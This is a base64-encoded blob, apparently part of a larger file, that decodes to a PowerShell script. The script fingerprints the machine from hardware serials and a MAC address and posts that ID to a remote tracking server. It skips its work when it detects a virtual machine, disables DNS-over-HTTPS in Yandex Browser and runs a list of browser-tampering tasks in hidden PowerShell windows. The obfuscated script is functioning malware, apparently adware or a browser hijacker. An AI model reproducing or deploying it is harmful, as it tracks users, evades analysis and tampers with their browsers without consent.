lbSBpbmZvcm1hdGlvbg0KICAgICRjb21wdXRlclN5c3RlbSA9IEdldC1XbWlPYmplY3QgLUNsYXNzIFdpbjMyX0NvbXB1dGVyU3lzdGVtDQogICAgJGlzVmlydHVhbCA9ICRmYWxzZQ0KDQogICAgIyBDaGVjayBmb3IgY29tbW9uIHZpcnR1YWxpemF0aW9uIG1hbnVmYWN0dXJlcnMNCiAgICAkdm1NYW51ZmFjdHVyZXJzID0gQCgNCiAgICAgICAgIk1pY3Jvc29mdCBDb3Jwb3JhdGlvbiIsICAgIyBIeXBlci1WDQogICAgICAgICJWTXdhcmUsIEluYy4iLCAgICAgICAgICAgICMgVk13YXJlDQogICAgICAgICJYZW4iLCAgICAgICAgICAgICAgICAgICAgICMgWGVuDQogICAgICAgICJYZW5Tb3VyY2UsIEluYy4iLCAgICAgICAgICMgWGVuU291cmNlDQogICAgICAgICJpbm5vdGVrIEdtYkgiLCAgICAgICAgICAgICMgVmlydHVhbEJveA0KICAgICAgICAiT3JhY2xlIENvcnBvcmF0aW9uIiwgICAgICAjIFZpcnR1YWxCb3gNCiAgICAgICAgIlBhcmFsbGVscyBTb2Z0d2FyZSBJbnRlcm5hdGlvbmFsIEluYy4iLCAjIFBhcmFsbGVscw0KICAgICAgICAiUUVNVSIsICAgICAgICAgICAgICAgICAgICAjIFFFTVUNCiAgICAgICAgIlJlZCBIYXQsIEluYy4iLCAgICAgICAgICAgIyBLVk0NCiAgICAgICAgIkFtYXpvbiBFQzIiLCAgICAgICAgICAgICAgIyBBV1MgRUMyDQogICAgICAgICJHb29nbGUiLCAgICAgICAgICAgICAgICAgICMgR29vZ2xlIENsb3VkIFBsYXRmb3JtDQogICAgICAgICJWaXJ0dW96em8iLCAgICAgICAgICAgICAgICMgVmlydHVvenpvDQogICAgICAgICJEaWdpdGFsT2NlYW4iICAgICAgICAgICAgICMgRGlnaXRhbE9jZWFuDQogICAgKQ0KDQogICAgIyBDaGVjayBNYW51ZmFjdHVyZXIgYW5kIE1vZGVsIGZvciBzaWducyBvZiB2aXJ0dWFsaXphdGlvbg0KICAgIGlmICgkdm1NYW51ZmFjdHVyZXJzIC1jb250YWlucyAkY29tcHV0ZXJTeXN0ZW0uTWFudWZhY3R1cmVyKSB7DQogICAgICAgICRpc1ZpcnR1YWwgPSAkdHJ1ZQ0KICAgIH0gZWxzZWlmICgkY29tcHV0ZXJTeXN0ZW0uTW9kZWwgLW1hdGNoICJWaXJ0dWFsfFZNfFZCT1h8S1ZNfFFFTVV8UGFyYWxsZWxzfFhlbiIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgIyBBZGRpdGlvbmFsIGNoZWNrcyBmb3IgdmlydHVhbGl6YXRpb24gdXNpbmcgV2luMzJfQklPUw0KICAgICRiaW9zID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQklPUw0KICAgIGlmICgkYmlvcy5TZXJpYWxOdW1iZXIgLW1hdGNoICJWTXdhcmV8VkJPWHxWaXJ0dWFsfFhlbnxRRU1VfFBhcmFsbGVscyIpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgIyBBZGRpdGlvbmFsIGNoZWNrcyB1c2luZyBXaW4zMl9Db21wdXRlclN5c3RlbVByb2R1Y3QNCiAgICAkY29tcHV0ZXJTeXN0ZW1Qcm9kdWN0ID0gR2V0LVdtaU9iamVjdCAtQ2xhc3MgV2luMzJfQ29tcHV0ZXJTeXN0ZW1Qcm9kdWN0DQogICAgaWYgKCRjb21wdXRlclN5c3RlbVByb2R1Y3QuVmVyc2lvbiAtbWF0Y2ggIlZpcnR1YWx8Vk18VkJPWHxLVk18UUVNVXxQYXJhbGxlbHN8WGVuIikgew0KICAgICAgICAkaXNWaXJ0dWFsID0gJHRydWUNCiAgICB9DQoNCiAgICAjIEFkZGl0aW9uYWwgcmVnaXN0cnkgY2hlY2sgZm9yIFBhcmFsbGVscw0KICAgICRwYXJhbGxlbHNLZXkgPSAiSEtMTTpcU09GVFdBUkVcUGFyYWxsZWxzXFBhcmFsbGVscyBUb29scyINCiAgICBpZiAoVGVzdC1QYXRoICRwYXJhbGxlbHNLZXkpIHsNCiAgICAgICAgJGlzVmlydHVhbCA9ICR0cnVlDQogICAgfQ0KDQogICAgcmV0dXJuICRpc1ZpcnR1YWwNCn0NCg0KDQpmdW5jdGlvbiBHZXQtTWFjaGluZUhhc2hDb2RlIHsNCiAgICAjIEdldCBCSU9TIFNlcmlhbCBOdW1iZXINCiAgICAkYmlvc1NlcmlhbCA9IChHZXQtV21pT2JqZWN0IFdpbjMyX0JJT1MpLlNlcmlhbE51bWJlcg0KDQogICAgIyBHZXQgTW90aGVyYm9hcmQgU2VyaWFsIE51bWJlcg0KICAgICRtYlNlcmlhbCA9IChHZXQtV21pT2JqZWN0IFdpbjMyX0Jhc2VCb2FyZCkuU2VyaWFsTnVtYmVyDQoNCiAgICAjIEdldCBNQUMgQWRkcmVzcyBvZiB0aGUgZmlyc3QgbmV0d29yayBhZGFwdGVyDQogICAgJG1hY0FkZHJlc3MgPSAoR2V0LVdtaU9iamVjdCBXaW4zMl9OZXR3b3JrQWRhcHRlckNvbmZpZ3VyYXRpb24gfCBXaGVyZS1PYmplY3QgeyAkXy5NQUNBZGRyZXNzIC1hbmQgJF8uSVBFbmFibGVkIH0pLk1BQ0FkZHJlc3NbMF0NCg0KICAgICMgQ29tYmluZSB0aGUgaGFyZHdhcmUgaWRlbnRpZmllcnMgaW50byBhIHNpbmdsZSBzdHJpbmcNCiAgICAkY29tYmluZWRTdHJpbmcgPSAiJGJpb3NTZXJpYWwkbWJTZXJpYWwkbWFjQWRkcmVzcyINCg0KICAgICMgQ29tcHV0ZSB0aGUgaGFzaCBjb2RlIHVzaW5nIFNIQTI1Ng0KICAgICRzaGEyNTYgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5TSEEyNTZdOjpDcmVhdGUoKQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGNvbWJpbmVkU3RyaW5nKQ0KICAgICRoYXNoQnl0ZXMgPSAkc2hhMjU2LkNvbXB1dGVIYXNoKCRieXRlcykNCiAgICAkaGFzaFN0cmluZyA9IFtCaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaEJ5dGVzKSAtcmVwbGFjZSAiLSIsICIiDQoNCiAgICByZXR1cm4gJGhhc2hTdHJpbmcNCn0NCg0KDQpmdW5jdGlvbiBHZW5lcmF0ZS1IYXNoIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJGRhdGEsDQogICAgICAgIFtzdHJpbmddJGtleQ0KICAgICkNCg0KICAgICRrZXlCeXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGtleSkNCiAgICAkZGF0YUJ5dGVzID0gW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRCeXRlcygkZGF0YSkNCiAgICANCiAgICAkaG1hYyA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5ITUFDU0hBMjU2DQogICAgJGhtYWMuS2V5ID0gJGtleUJ5dGVzDQogICAgJGhhc2hCeXRlcyA9ICRobWFjLkNvbXB1dGVIYXNoKCRkYXRhQnl0ZXMpDQogICAgDQogICAgcmV0dXJuIFtDb252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJGhhc2hCeXRlcykNCn0NCg0KZnVuY3Rpb24gV3JpdGUtU3RyaW5nVG9GaWxlIHsNCiAgICBwYXJhbSAoDQogICAgICAgIFtzdHJpbmddJEZpbGVOYW1lLA0KICAgICAgICBbc3RyaW5nXSRDb250ZW50DQogICAgKQ0KICAgIA0KICAgICMgR2V0IHRoZSBwYXRoIHRvIHRoZSBkZXNrdG9wDQogICAgJERlc2t0b3BQYXRoID0gW1N5c3RlbS5FbnZpcm9ubWVudF06OkdldEZvbGRlclBhdGgoJ0Rlc2t0b3AnKQ0KICAgIA0KICAgICMgQ3JlYXRlIHRoZSBmdWxsIHBhdGggdG8gdGhlIGZpbGUNCiAgICAkRmlsZVBhdGggPSBKb2luLVBhdGggLVBhdGggJERlc2t0b3BQYXRoIC1DaGlsZFBhdGggJEZpbGVOYW1lDQogICAgDQogICAgIyBXcml0ZSB0aGUgY29udGVudCB0byB0aGUgZmlsZSwgY3JlYXRpbmcgb3Igb3ZlcndyaXRpbmcgaXQNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkRmlsZVBhdGggLVZhbHVlICRDb250ZW50DQp9DQoNCmZ1bmN0aW9uIEdldFNlcmllKCkNCnsNCiAgICByZXR1cm4gUmVnUmVhZFBhcmFtIC1rZXlOYW1lICJ0cmFja1NlcmllIg0KfQ0KDQoNCmZ1bmN0aW9uIGRvX3RyYWNrZXIgew0KICAgIGlmICgkc2VydmVyLnRyYWNrIC1lcSAkZmFsc2Upew0KICAgICAgICByZXR1cm4NCiAgICB9DQoNCiAgICAkaXNWTSA9IElzLVZpcnR1YWxNYWNoaW5lDQogICAgaWYgKCRpc1ZNIC1lcSAkdHJ1ZSl7DQogICAgICAgIHJldHVybg0KICAgIH0NCg0KICAgICRlbGV2YXRlZCA9IDANCiAgICBpZiAoSXNFbGV2YXRlZCkNCiAgICB7DQogICAgICAgICRlbGV2YXRlZD0xOw0KICAgIH0NCg0KICAgICRpZCA9IEdldC1NYWNoaW5lSGFzaENvZGUNCg0KICAgICRib2R5ID0gIntgImlkYCI6YCIkKCRpZC5Ub1N0cmluZygpKWAiLGAic2VyaWVgIjpgIiQoR2V0U2VyaWUpYCIsYCJlbGV2YXRlZF9udW1iZXJgIjokKCRlbGV2YXRlZCl9Ig0KDQoNCiAgICAjIFNlY3JldCBrZXkgKHNoYXJlZCB3aXRoIHRoZSBzZXJ2ZXIpDQogICAgJHNlY3JldEtleSA9ICJZb3VyU2VjcmV0S2V5SGVyZSINCg0KICAgICR1cmw9ICRzZXJ2ZXIudHJhY2tVcmwNCiAgDQogICAgIyBHZW5lcmF0ZSB0aGUgaGFzaCBmb3IgdGhlIEpTT04gcmVxdWVzdCBib2R5DQogICAgJGhhc2ggPSBHZW5lcmF0ZS1IYXNoIC1kYXRhICRib2R5IC1rZXkgJHNlY3JldEtleQ0KDQogICAgIyBQcmVwYXJlIGhlYWRlcnMNCiAgICAkaGVhZGVycyA9IEB7DQogICAgICAgICJYLVNpZ25hdHVyZSIgPSAkaGFzaA0KICAgICAgICAiQ29udGVudC1UeXBlIiA9ICJhcHBsaWNhdGlvbi9qc29uIg0KICAgICAgICAiVXNlci1BZ2VudCIgID0gIlBvd2VyU2hlbGwvNy4yIiAgIyBVc2UgdGhlIFVzZXItQWdlbnQgZnJvbSBQb3N0bWFuIGlmIGtub3duDQogICAgfQ0KDQogICAgJHRpbWVvdXQgPSBbZGF0ZXRpbWVdOjpVdGNOb3cuQWRkTWludXRlcygxKQ0KICAgICRkZWxheSA9IDUNCg0KICAgIA0KICAgIHdoaWxlIChbZGF0ZXRpbWVdOjpVdGNOb3cgLWx0ICR0aW1lb3V0KSANCiAgICB7DQogICAgIA0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIEludm9rZS1XZWJSZXF1ZXN0IC1IZWFkZXJzICRoZWFkZXJzIC1NZXRob2QgIlBPU1QiIC1Cb2R5ICRib2R5IC1VcmkgJHVybCAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgiDQogICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBjYXRjaCBbU3lzdGVtLk5ldC5XZWJFeGNlcHRpb25dIHsNCiAgICAgICAgICAgICAgICAkc3RhdHVzQ29kZSA9ICRfLkV4Y2VwdGlvbi5SZXNwb25zZS5TdGF0dXNDb2RlDQogICAgICAgICAgICAgICAgJHJlc3BTdHJlYW0gPSAkXy5FeGNlcHRpb24uUmVzcG9uc2UuR2V0UmVzcG9uc2VTdHJlYW0oKQ0KICAgICAgICAgICAgICAgICRyZWFkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5JTy5TdHJlYW1SZWFkZXIoJHJlc3BTdHJlYW0pDQogICAgICAgICAgICAgICAgJHJlYWRlci5CYXNlU3RyZWFtLlBvc2l0aW9uID0gMA0KICAgICAgICAgICAgICAgICRyZXNwb25zZUJvZHkgPSAkcmVhZGVyLlJlYWRUb0VuZCgpIHwgQ29udmVydEZyb20tSnNvbg0KICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3IgbWFraW5nIHJlcXVlc3Q6ICRyZXNwb25zZUJvZHkiDQogICAgICAgICAgICANCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNhdGNoew0KICAgICAgICAgICAgICAgICAgICB3cml0ZWRiZyAiRXJyb3IgbWFraW5nIHJlcXVlc3Q6ICRfIg0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkZGVsYXkNCiAgICB9DQoNCiAgICBpZiAoJHNlcnZlci50cmFja0Rlc2t0b3AgLWVxICR0cnVlKXsNCiAgICAgICAgV3JpdGUtU3RyaW5nVG9GaWxlIC1GaWxlTmFtZSAiJCgkc2VydmVyLnRyYWNrU2VyaWUpLnR4dCIgLUNvbnRlbnQgJGlkDQogICAgfQ0KDQp9DQoNCmZ1bmN0aW9uIGRvX3lhbmRleA0Kew0KICAgIENsb3NlLVByb2Nlc3NlcyhAKCdzZXJ2aWNlX3VwZGF0ZS5leGUnLCdicm93c2VyLmV4ZScpKQ0KDQogICAgZm9yZWFjaCAoJGRpciBpbiBHZXQtRW52UGF0aHMpIHsNCiAgICAgICAgJHBhdGggPSBKb2luLVBhdGggLVBhdGggJGRpciAtQ2hpbGRQYXRoICdZYW5kZXhcWWFuZGV4QnJvd3NlclxVc2VyIERhdGFcTG9jYWwgU3RhdGUnDQoNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgIGlmIChUZXN0LVBhdGggLVBhdGggJHBhdGggLVBhdGhUeXBlIExlYWYpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgLUZpbGVQYXRoICRwYXRoDQogICAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggew0KICAgICAgICAgICAgd3JpdGVkYmcgIkVycm9yIG9jY3VycmVkOiAkXyINCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gQ29uZmlndXJlWWFuZGV4SW50ZXJuYWwgew0KICAgIHBhcmFtKA0KICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aA0KICAgICkNCiAgICAkY29udGVudCA9IEdldC1Db250ZW50IC1QYXRoICRmaWxlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbg0KDQogICAgaWYgKCRudWxsIC1lcSAkY29udGVudC5kbnNfb3Zlcl9odHRwcyAtb3IgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMgLWlzbm90IFtvYmplY3RdKSB7DQogICAgICAgICRjb250ZW50IHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgJ2Ruc19vdmVyX2h0dHBzJyAtVmFsdWUgQHsNCiAgICAgICAgICAgICdtb2RlJyA9ICdvZmYnDQogICAgICAgICAgICAndGVtcGxhdGVzJyA9ICIiDQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkY29udGVudC5kbnNfb3Zlcl9odHRwcy5tb2RlID0gJ29mZicNCiAgICAgICAgJGNvbnRlbnQuZG5zX292ZXJfaHR0cHMudGVtcGxhdGVzID0gIiINCiAgICB9DQoNCiAgICAkanNvblN0cmluZyA9ICRjb250ZW50IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDEwDQoNCiAgICBTZXQtQ29udGVudCAtUGF0aCAkZmlsZVBhdGggLVZhbHVlICRqc29uU3RyaW5nIC1FbmNvZGluZyBVVEY4IC1Gb3JjZQ0KDQogICAgd3JpdGVkYmcgIlN1Y2Nlc3NmdWxseSBjb25maWd1cmVkIFlhbmRleCBzZXR0aW5ncyBpbiAkZmlsZVBhdGgiDQp9DQoNCiMjI2hlYWQNCg0KDQoNCmZ1bmN0aW9uIEludm9rZS1TY3JpcHQNCnsNCiAgICBwYXJhbQ0KICAgICgNCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldDQogICAgICAgIFtzdHJpbmddDQogICAgICAgICRzY3JpcHRQYXRoLA0KDQogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0KICAgICAgICBbc3RyaW5nW11dDQogICAgICAgICR0YXNrTmFtZQ0KICAgICkNCiAgICBpZiAoJGdsb2JhbERlYnVnKQ0KICAgIHsNCiAgICAgICAgU3RhcnQtUHJvY2VzcyBwb3dlcnNoZWxsLmV4ZSAtV2luZG93U3R5bGUgTm9ybWFsIC1Bcmd1bWVudExpc3QgIi1maWxlICIiJHNjcmlwdFBhdGgiIiAtVGFzayAkdGFza05hbWUiDQogICAgfQ0KICAgIGVsc2UNCiAgICB7DQogICAgICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLVdpbmRvd1N0eWxlIEhpZGRlbiAtQXJndW1lbnRMaXN0ICItZmlsZSAiIiRzY3JpcHRQYXRoIiIgLVRhc2sgJHRhc2tOYW1lIg0KICAgIH0NCn0NCg0KJGdsb2JhbDpUYXNrID0gJG51bGwNCg0KZm9yICgkaSA9IDA7ICRpIC1sdCAkYXJncy5Db3VudDsgJGkrKykgew0KICAgIGlmICgkYXJnc1skaV0gLWVxICctVGFzaycpIHsNCiAgICAgICAgaWYgKCRpICsgMSAtbHQgJGFyZ3MuQ291bnQpIHsNCiAgICAgICAgICAgICRnbG9iYWw6VGFzayA9ICRhcmdzWyRpICsgMV0NCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHdyaXRlZGJnICJObyB2YWx1ZSBwcm92aWRlZCBmb3IgLVRhc2sgYXJndW1lbnQuIg0KICAgICAgICB9DQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBNYWluIA0Kew0KICAgICRzY3JpcHRQYXRoID0gR2V0LVNjcmlwdFBhdGgNCiAgICB3cml0ZWRiZyAicHJvZ3JhbSBjdXJTY3JpcHQ6ICRzY3JpcHRQYXRoIg0KDQogICAgaWYgKCRnbG9iYWw6VGFzaykgew0KICAgICAgICB3cml0ZWRiZyAiVGFzayAtICR0YXNrIg0KICAgICAgICAmICRnbG9iYWw6VGFzaw0KICAgIH0gZWxzZSB7ICAgICAgICAgICAgICAgDQoNCiAgICAgICAgJHRhc2tGdW5jdGlvbnMgPSBAKA0KICAgICAgICAgICAgJ2RvX2Ruc21hbicsJ2RvX2NlcnQnLCdkb19jaHJvbWUnLCdkb19jaHJvbWVfcHVzaCcsJ2RvX2Nocm9tZV91YmxvY2snLCdkb19lZGdlJywnZG9fZW1iZWRkaW5ncycsJ2RvX2ZpcmVmb3gnLCdkb19vcGVyYScsJ2RvX3N0YXJ0ZG93bmxvYWRzJywnZG9fc3RhcnR1cmxzJywnZG9fdHJhY2tlcicsJ2RvX3lhbmRleCcsJ2RvX2V4dHJhdXBkYXRlJw0KICAgICAgICApDQoNCiAgICAgICAgd3JpdGVkYmcgIk1haW4gLSAiDQogICAgICAgIGZvcmVhY2ggKCR0YXNrIGluICR0YXNrRnVuY3Rpb25zKSANCiAgICAgICAgew0KICAgICAgICAgICAgd3JpdGVkYmcgIk1haW4gLSAkdGFzayINCiAgICAgICAgICAgIEludm9rZS1TY3JpcHQgJHNjcmlwdFBhdGggJHRhc2sNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KTWFpbg=="
